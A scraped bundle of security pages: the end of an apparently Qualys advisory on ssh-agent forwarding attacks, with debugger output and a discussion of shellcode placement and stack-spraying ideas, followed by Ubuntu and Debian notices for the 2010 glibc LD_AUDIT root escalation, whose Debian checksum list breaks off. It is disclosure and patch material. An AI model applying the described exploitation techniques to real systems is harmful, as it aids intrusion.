57296      0x00007f7c8ea99470 <_Unwind_GetCFA@...+0>:   endbr64
57297      0x00007f7c8ea99474 <_Unwind_GetCFA@...+4>:   bnd jmp *0x1bc2d(%rip)        # 0x7f7c8eab50a8 <_Unwind_GetCFA@....plt>

57298      0x00007f7c8edce920 <_Unwind_GetCFA+0>:       sub    $0x18,%rsp
57299      0x00007f7c8edce924 <_Unwind_GetCFA+4>:       mov    %fs:0x28,%rax
57300      0x00007f7c8edce92d <_Unwind_GetCFA+13>:      mov    %rax,0x10(%rsp)
57301      0x00007f7c8edce932 <_Unwind_GetCFA+18>:      lea    0x8(%rsp),%rdx
57302      0x00007f7c8edce937 <_Unwind_GetCFA+23>:      mov    $0xfffffffe,%esi
57303      0x00007f7c8edce93c <_Unwind_GetCFA+28>:      call   0x7f7c8edca6b0 <unw_get_reg>

57304      0x00007f7c8edca6b0 <unw_get_reg+0>:  push   %rbp
57305      0x00007f7c8edca6b1 <unw_get_reg+1>:  push   %r14
57306      0x00007f7c8edca6b3 <unw_get_reg+3>:  push   %rbx
57307      0x00007f7c8edca6b4 <unw_get_reg+4>:  mov    %rdx,%r14
57308      0x00007f7c8edca6b7 <unw_get_reg+7>:  mov    %esi,%ebp
57309      0x00007f7c8edca6b9 <unw_get_reg+9>:  mov    %rdi,%rbx
57310      0x00007f7c8edca6bc <unw_get_reg+12>: mov    (%rdi),%rax
57311      0x00007f7c8edca6bf <unw_get_reg+15>: call   *0x10(%rax)

(gdb) !grep 7f7c8ea /proc/3635541/maps
7f7c8ea99000-7f7c8eab0000 r-xp 00003000 08:03 8788336                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1

(gdb) !grep 7f7c8ed /proc/3635541/maps
7f7c8edc9000-7f7c8edd1000 r-xp 00000000 08:03 11148811                   /usr/lib/llvm-14/lib/libunwind.so.1.0
------------------------------------------------------------------------

========================================================================
RCE in library constructor
========================================================================

As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.

The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:

    <https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt>

This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.

========================================================================
Discussion
========================================================================

We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:

- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
  versions, distributions, or operating systems might be hiding further
  surprises;

- our rudimentary fuzzer can certainly be greatly improved, and has
  definitely not tried all the combinations of shared libraries and side
  effects;

- we have identified seven attack vectors against ssh-agent (described
  in the "Results" section), but we have not analyzed in detail all the
  results of our fuzzer;

- we have not fully explored various aspects of these attack vectors:

  - it might be possible to reliably exploit the "Sigaltstack
    use-after-free" (by carefully overwriting the .data or .bss segment
    of a shared library) or the "Sigreturn to arbitrary instruction
    pointer" (by partially overwriting a leftover pointer in
    ssh-pkcs11-helper's stack);

  - we currently store our shellcode in ssh-pkcs11-helper's main() stack
    buffer only, but it might be possible to store shellcode in other
    stack buffers as well, or somehow spray the stack with shellcode,
    which would dramatically increase our chances of jumping into our
    shellcode;

    for example, we tried to spray the stack with shellcode by
    interrupting a memcpy() of controlled data with a signal handler,
    thereby spilling controlled YMM registers to the stack (inspired by
    <https://bugs.chromium.org/p/project-zero/issues/detail?id=2266>), but
    we failed because we can memcpy() only ~10KB of data, and because we
    cannot remotely use tricks such as inotify or sched*() to precisely
    time this race;

  - it might be possible to control the mmap layout of ssh-pkcs11-helper
    with page precision (which would allow us to precisely control the
    gadget that replaces the unmapped signal handler, callback function,
    or return from syscall), but we failed to find large malloc()ations
    (which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
    influence the mmap layout is to load and unload shared libraries, as
    mentioned in Step 4a/ of the "Experiments" section);

  - instead of replacing the unmapped signal handler or callback
    function (or return from syscall) with a gadget from another shared
    library, it is perfectly possible to replace it with an executable
    thread stack (made executable by loading an "execstack" library),
    but we have failed so far to control the contents of such a thread
    stack.

========================================================================
Acknowledgments
========================================================================

We thank the OpenSSH developers, and Damien Miller in particular, for
their outstanding work on this vulnerability and on OpenSSH in general.
We also thank Mitre's CVE Assignment Team for their quick response.
Finally, we dedicate this advisory to the Midnight Fox.

========================================================================
Timeline
========================================================================

2023-07-06: We sent a draft of our advisory and a preliminary patch to
the OpenSSH developers.

2023-07-07: The OpenSSH developers replied and sent us a more complete
set of patches.

2023-07-09: We sent feedback about these patches to the OpenSSH
developers.

2023-07-11: The OpenSSH developers sent us a complete set of patches,
and we sent them feedback about these patches.

2023-07-14: The OpenSSH developers informed us that "we're aiming to
make a security-only release ... on July 19th."

2023-07-19: Coordinated release.

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.ubuntu.com_a4c0669d_20250126_124106.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-1009-1: GNU C Library vulnerabilities

22 October 2010

Local root escalation via LD\_AUDIT environment variable.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 10.10](/security/notices?release=maverick)
* [Ubuntu 10.04](/security/notices?release=lucid)
* [Ubuntu 9.10](/security/notices?release=karmic)
* [Ubuntu 9.04](/security/notices?release=jaunty)
* [Ubuntu 8.04](/security/notices?release=hardy)

## Packages

* [eglibc](/security/cves?package=eglibc) - GNU C Library
* [glibc](/security/cves?package=glibc) - GNU C Library

## Details

Tavis Ormandy discovered multiple flaws in the GNU C Library's handling

of the LD\_AUDIT environment variable when running a privileged binary. A

local attacker could exploit this to gain root privileges. ([CVE-2010-3847](/security/CVE-2010-3847),

[CVE-2010-3856](/security/CVE-2010-3856))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 9.10

* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.10.1-0ubuntu18](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.10.1-0ubuntu18)

##### Ubuntu 9.04

* [libc6](https://launchpad.net/ubuntu/%2Bsource/glibc)
  -
  [2.9-4ubuntu6.3](https://launchpad.net/ubuntu/%2Bsource/glibc/2.9-4ubuntu6.3)

##### Ubuntu 8.04

* [libc6](https://launchpad.net/ubuntu/%2Bsource/glibc)
  -
  [2.7-10ubuntu7](https://launchpad.net/ubuntu/%2Bsource/glibc/2.7-10ubuntu7)

##### Ubuntu 10.10

* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.12.1-0ubuntu8](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.12.1-0ubuntu8)

##### Ubuntu 10.04

* [libc6](https://launchpad.net/ubuntu/%2Bsource/eglibc)
  -
  [2.11.1-0ubuntu7.5](https://launchpad.net/ubuntu/%2Bsource/eglibc/2.11.1-0ubuntu7.5)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2010-3847](/security/CVE-2010-3847)
* [CVE-2010-3856](/security/CVE-2010-3856)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from packetstormsecurity.com_a515cad5_20250125_231129.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from packetstormsecurity.com_bf1537f0_20250125_231130.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.debian.org_8e6cdeb5_20250125_231144.html ===


---

[[Date Prev](msg00171.html)][[Date Next](msg00173.html)]
[[Thread Prev](msg00171.html)][[Thread Next](msg00173.html)]
[[Date Index](maillist.html#00172)]
[[Thread Index](threads.html#00172)]

# [SECURITY] [DSA 2122-1] New glibc packages fix local privilege escalation

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 2122-1] New glibc packages fix local privilege escalation
* *From*: Florian Weimer <fw@deneb.enyo.de>
* *Date*: Fri, 22 Oct 2010 19:05:33 +0200
* *Message-id*: <[[🔎]](/msgid-search/87pqv2taxu.fsf%40mid.deneb.enyo.de) [87pqv2taxu.fsf@mid.deneb.enyo.de](msg00172.html)>
* *Reply-to*: debian-security@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

- ------------------------------------------------------------------------
Debian Security Advisory DSA-2122-1                  security@debian.org
<http://www.debian.org/security/>                           Florian Weimer
October 22, 2010                      <http://www.debian.org/security/faq>
- ------------------------------------------------------------------------

Package        : glibc
Vulnerability  : missing input sanitization
Problem type   : local
Debian-specific: no
CVE Id(s)      : CVE-2010-3847 CVE-2010-3856
Debian Bug     : 600667

Ben Hawkes and Tavis Ormandy discovered that the dynamic loader in GNU
libc allows local users to gain root privileges using a crafted
LD_AUDIT environment variable.

For the stable distribution (lenny), this problem has been fixed in
version 2.7-18lenny6.

For the upcoming stable distribution (squeeze), this problem has been
fixed in version 2.11.2-6+squeeze1 of the eglibc package.

For the unstable distribution (sid), this problem will be fixed soon.

We recommend that you upgrade your glibc packages.

Upgrade instructions
- --------------------

wget url
        will fetch the file for you
dpkg -i file.deb
        will install the referenced file.

If you are using the apt-get package manager, use the line for
sources.list as given below:

apt-get update
        will update the internal database
apt-get upgrade
        will install corrected packages

You may use an automated update by adding the resources from the
footer to the proper configuration.

Debian GNU/Linux 5.0 alias lenny
- --------------------------------

Source archives:

  <http://security.debian.org/pool/updates/main/g/glibc/glibc_2.7.orig.tar.gz>
    Size/MD5 checksum: 15386750 8816fbab13a072c0ccef6640c9d20833
  <http://security.debian.org/pool/updates/main/g/glibc/glibc_2.7-18lenny6.dsc>
    Size/MD5 checksum:     2864 0a5bae105aada2473191dd8706b4ee3f
  <http://security.debian.org/pool/updates/main/g/glibc/glibc_2.7-18lenny6.diff.gz>
    Size/MD5 checksum:   767588 3421a1ff8874348dae35cdf58f447036

Architecture independent packages:

  <http://security.debian.org/pool/updates/main/g/glibc/glibc-doc_2.7-18lenny6_all.deb>
    Size/MD5 checksum:  1629030 8f65d80bdb65e1fcefe13a0f67bb350e
  <http://security.debian.org/pool/updates/main/g/glibc/locales_2.7-18lenny6_all.deb>
    Size/MD5 checksum:  4432002 d805e02d461e67f5df3c4dfd87d5ed60
  <http://security.debian.org/pool/updates/main/g/glibc/glibc-source_2.7-18lenny6_all.deb>
    Size/MD5 checksum: 16008612 5e40f562173996225e7e6145d60aeeba

alpha architecture (DEC Alpha)

  <http://security.debian.org/pool/updates/main/g/glibc/libnss-dns-udeb_2.7-18lenny6_alpha.udeb>
    Size/MD5 checksum:    10598 0d8d9de0d9a1ec2bca4c23fc7f8cbf55
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1_2.7-18lenny6_alpha.deb>
    Size/MD5 checksum:  5184504 66f0a51bc250550f677e7ae6a3032d0a
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1-pic_2.7-18lenny6_alpha.deb>
    Size/MD5 checksum:  1769546 ef42037cfcb204b3335945ed7b5a1c85
  <http://security.debian.org/pool/updates/main/g/glibc/locales-all_2.7-18lenny6_alpha.deb>
    Size/MD5 checksum:  2785836 89667d60330729285695c432ed4abcc8
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1-udeb_2.7-18lenny6_alpha.udeb>
    Size/MD5 checksum:  1264184 e70f66d132ebe98e6e0f2606b4ca7121
  <http://security.debian.org/pool/updates/main/g/glibc/nscd_2.7-18lenny6_alpha.deb>
    Size/MD5 checksum:   177554 517af3bee8605c24c28149ed0fa846bb
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-files-udeb_2.7-18lenny6_alpha.udeb>
    Size/MD5 checksum:    18208 874fac32cc088d505a8602a53257912f
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1-alphaev67_2.7-18lenny6_alpha.deb>
    Size/MD5 checksum:  1621418 3d2391946aa8adfd971b56929057382e
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1-dev_2.7-18lenny6_alpha.deb>
    Size/MD5 checksum:  3029300 917d3528ddb06384b0280b53930a16c0
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1-prof_2.7-18lenny6_alpha.deb>
    Size/MD5 checksum:  2492118 47763d04fe3bcc9f1f699d2dc7f55310
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1-dbg_2.7-18lenny6_alpha.deb>
    Size/MD5 checksum:  5716602 27bf48fd5d0675258055d92c43b6c51f

amd64 architecture (AMD x86_64 (AMD64))

  <http://security.debian.org/pool/updates/main/g/glibc/libc6-prof_2.7-18lenny6_amd64.deb>
    Size/MD5 checksum:  1930488 301009193e3780a911f1e184fce9b87c
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev_2.7-18lenny6_amd64.deb>
    Size/MD5 checksum:  2491416 13d2fc9d3564f309044ad1ea2c58495a
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-pic_2.7-18lenny6_amd64.deb>
    Size/MD5 checksum:  1465870 b621d62248666d277ac0a3f2eaa8b045
  <http://security.debian.org/pool/updates/main/g/glibc/libc6_2.7-18lenny6_amd64.deb>
    Size/MD5 checksum:  4811778 7d7b313aa5a62e9740717aca453da85b
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-files-udeb_2.7-18lenny6_amd64.udeb>
    Size/MD5 checksum:    18312 e5a0ab207278a9b261a4a344eb8c4e72
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dbg_2.7-18lenny6_amd64.deb>
    Size/MD5 checksum:  5310524 d375d550ade43fa25466ef294944b20f
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-udeb_2.7-18lenny6_amd64.udeb>
    Size/MD5 checksum:  1107334 c858864db43656cb5b7b1336a1dd330a
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-i386_2.7-18lenny6_amd64.deb>
    Size/MD5 checksum:  3653662 71f16ba7e73ce2848e91a9f987e0e0c5
  <http://security.debian.org/pool/updates/main/g/glibc/nscd_2.7-18lenny6_amd64.deb>
    Size/MD5 checksum:   175502 b5278e6ac5be9509e4022d6230730aaf
  <http://security.debian.org/pool/updates/main/g/glibc/locales-all_2.7-18lenny6_amd64.deb>
    Size/MD5 checksum:  2668436 bd07d5def2d94fe57ad0a4a61225e4f2
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-dns-udeb_2.7-18lenny6_amd64.udeb>
    Size/MD5 checksum:     9424 2da7259ac87a89eff1e0c618b134d49d
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev-i386_2.7-18lenny6_amd64.deb>
    Size/MD5 checksum:  1459294 73863f0cc3a77b3ca0ca5329bebbabc0

arm architecture (ARM)

  <http://security.debian.org/pool/updates/main/g/glibc/libnss-files-udeb_2.7-18lenny6_arm.udeb>
    Size/MD5 checksum:    14572 ddab929ec6fa049cf4e52b4735269d16
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-dns-udeb_2.7-18lenny6_arm.udeb>
    Size/MD5 checksum:     8412 5fca17c0a6d1b48e484ad9037ee0994c
  <http://security.debian.org/pool/updates/main/g/glibc/locales-all_2.7-18lenny6_arm.deb>
    Size/MD5 checksum:  2736634 e61e1e08d66addabdb5b665cf43e26e8
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev_2.7-18lenny6_arm.deb>
    Size/MD5 checksum:  2323658 984466b5b0532144daab59034edca3cb
  <http://security.debian.org/pool/updates/main/g/glibc/libc6_2.7-18lenny6_arm.deb>
    Size/MD5 checksum:  4808794 60d9f6ec51af1605a392d95d93d31e4b
  <http://security.debian.org/pool/updates/main/g/glibc/nscd_2.7-18lenny6_arm.deb>
    Size/MD5 checksum:   172086 5e2f841ecdff47482b1585bce2da7df8
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dbg_2.7-18lenny6_arm.deb>
    Size/MD5 checksum:  5075604 fa409ef42bd0ef3f1f66f480f80de30d
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-udeb_2.7-18lenny6_arm.udeb>
    Size/MD5 checksum:  1026954 e827dee053f34271ebf8b56584d56fe6
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-pic_2.7-18lenny6_arm.deb>
    Size/MD5 checksum:  1323732 4ebf4d047b8672d0e8c6a62c239de06a
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-prof_2.7-18lenny6_arm.deb>
    Size/MD5 checksum:  1779334 8d1fb933c701c11173fb85928d2410a7

armel architecture (ARM EABI)

  <http://security.debian.org/pool/updates/main/g/glibc/libnss-dns-udeb_2.7-18lenny6_armel.udeb>
    Size/MD5 checksum:     8152 81202c8c8ad425f96e6d6ed52a25ec39
  <http://security.debian.org/pool/updates/main/g/glibc/nscd_2.7-18lenny6_armel.deb>
    Size/MD5 checksum:   171442 c4702ab1e1d00dd9869169aa4b7590e0
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-udeb_2.7-18lenny6_armel.udeb>
    Size/MD5 checksum:  1084506 347267bb7cde5208b139c91c6ce4d206
  <http://security.debian.org/pool/updates/main/g/glibc/locales-all_2.7-18lenny6_armel.deb>
    Size/MD5 checksum:  2754836 3e35ea49bd22c8c7f9181b8e5d5c318c
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-files-udeb_2.7-18lenny6_armel.udeb>
    Size/MD5 checksum:    14552 d97fae3cf5dd84eb0fa4cf47e0ac4a58
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-prof_2.7-18lenny6_armel.deb>
    Size/MD5 checksum:  1893768 d6d491af7592cd0812703c4275dbe61e
  <http://security.debian.org/pool/updates/main/g/glibc/libc6_2.7-18lenny6_armel.deb>
    Size/MD5 checksum:  4859952 7540ba353f9148df5d9327ae04198ab2
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev_2.7-18lenny6_armel.deb>
    Size/MD5 checksum:  2429200 c642380c514ef2e19a8719b0efc54859
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-pic_2.7-18lenny6_armel.deb>
    Size/MD5 checksum:  1396316 f93d072458c00f78afff26ae8197ca3f
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dbg_2.7-18lenny6_armel.deb>
    Size/MD5 checksum:  5120630 7a9e30417a07b1d9f28aeeeb91397267

i386 architecture (Intel ia32)

  <http://security.debian.org/pool/updates/main/g/glibc/libc6-udeb_2.7-18lenny6_i386.udeb>
    Size/MD5 checksum:   823448 2c61ad8fc7755f1076db8eeef825dd06
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-prof_2.7-18lenny6_i386.deb>
    Size/MD5 checksum:  1439724 fd2e06d55f52fc6a3e019d4ba5837ca5
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dbg_2.7-18lenny6_i386.deb>
    Size/MD5 checksum:  5232058 d8e9dabc806bb2ed2fb511ca469fcdee
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-dns-udeb_2.7-18lenny6_i386.udeb>
    Size/MD5 checksum:     8684 2d1a4f27a5b03dee1d491badde82bbc8
  <http://security.debian.org/pool/updates/main/g/glibc/nscd_2.7-18lenny6_i386.deb>
    Size/MD5 checksum:   172476 a2f5e1a6d887aac2472cd1d49bd8b6a1
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-pic_2.7-18lenny6_i386.deb>
    Size/MD5 checksum:  1155474 3e7e02bc61cf9fd9a37f116d94dd46c5
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-xen_2.7-18lenny6_i386.deb>
    Size/MD5 checksum:  1282052 d3a231b42e4874ed94b0646c58293bcd
  <http://security.debian.org/pool/updates/main/g/glibc/locales-all_2.7-18lenny6_i386.deb>
    Size/MD5 checksum:  2752152 9a75846acb12d557acce71a4c9cf6843
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-files-udeb_2.7-18lenny6_i386.udeb>
    Size/MD5 checksum:    15430 623f53acca1c321df95e3bfcef5369f8
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev-amd64_2.7-18lenny6_i386.deb>
    Size/MD5 checksum:  2013266 884c9914eac037f20c66f1c064cc680a
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-amd64_2.7-18lenny6_i386.deb>
    Size/MD5 checksum:  4200546 880701716e329b71ee8bcc77664f2a94
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-i686_2.7-18lenny6_i386.deb>
    Size/MD5 checksum:  1278036 fd042101131cf66f38e49d78e2c6b6f4
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev_2.7-18lenny6_i386.deb>
    Size/MD5 checksum:  3386072 25e9b2c60b89e48bff1f3822f6f4d659
  <http://security.debian.org/pool/updates/main/g/glibc/libc6_2.7-18lenny6_i386.deb>
    Size/MD5 checksum:  4566382 728924c508553af78ea05b7c280c1a97

ia64 architecture (Intel ia64)

  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1-dbg_2.7-18lenny6_ia64.deb>
    Size/MD5 checksum:  6281358 373330ebff126d6f38cf0a4b42c5f4eb
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-dns-udeb_2.7-18lenny6_ia64.udeb>
    Size/MD5 checksum:    12938 630326390c12702e145c2de076efc258
  <http://security.debian.org/pool/updates/main/g/glibc/locales-all_2.7-18lenny6_ia64.deb>
    Size/MD5 checksum:  2777628 faebb3c3e2f26718b1c43bbaab419f68
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1-prof_2.7-18lenny6_ia64.deb>
    Size/MD5 checksum:  2690068 6d912e3866dde96fe6239fb7a15e6572
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-files-udeb_2.7-18lenny6_ia64.udeb>
    Size/MD5 checksum:    22610 a6b2b0fad2214deef0faf68f7a7cf948
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1_2.7-18lenny6_ia64.deb>
    Size/MD5 checksum:  5801636 99a01fd6de8a06380d1c3b480a10aea3
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1-dev_2.7-18lenny6_ia64.deb>
    Size/MD5 checksum:  3244424 ae91430034f2313326f7b4944e7ed289
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1-pic_2.7-18lenny6_ia64.deb>
    Size/MD5 checksum:  1742584 0283e8f3dd5aa89c630f3dab3f4a92cd
  <http://security.debian.org/pool/updates/main/g/glibc/libc6.1-udeb_2.7-18lenny6_ia64.udeb>
    Size/MD5 checksum:  1383338 9066cf3f6988a21645abe7236ec61c93
  <http://security.debian.org/pool/updates/main/g/glibc/nscd_2.7-18lenny6_ia64.deb>
    Size/MD5 checksum:   197680 70c768e048efe5b43d2a79c0f937f747

mips architecture (MIPS (Big Endian))

